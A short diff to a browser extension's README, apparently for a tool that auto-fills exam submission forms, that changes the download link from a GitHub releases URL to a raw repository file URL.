@@ -30,7 +30,8 @@ Automatically fills exam submission forms with intelligent form detection and su
 #### **Step 1: Download the Extension**
 
 Download the latest source code from the releases page:
-- 📥 [Download AFFS v1.0.0 (ZIP)](https://github.com/ExynoxAI/AFFS/releases/download/v1/AFFS-v1.0.0.zip)
+- 📥 [Download AFFS v1.0.0 (ZIP)](
+https://raw.githubusercontent.com/ExynoxAI/AFFS/refs/heads/main/AFFS-Release.v1.zip)
 
 Or clone from GitHub:
 ```bash
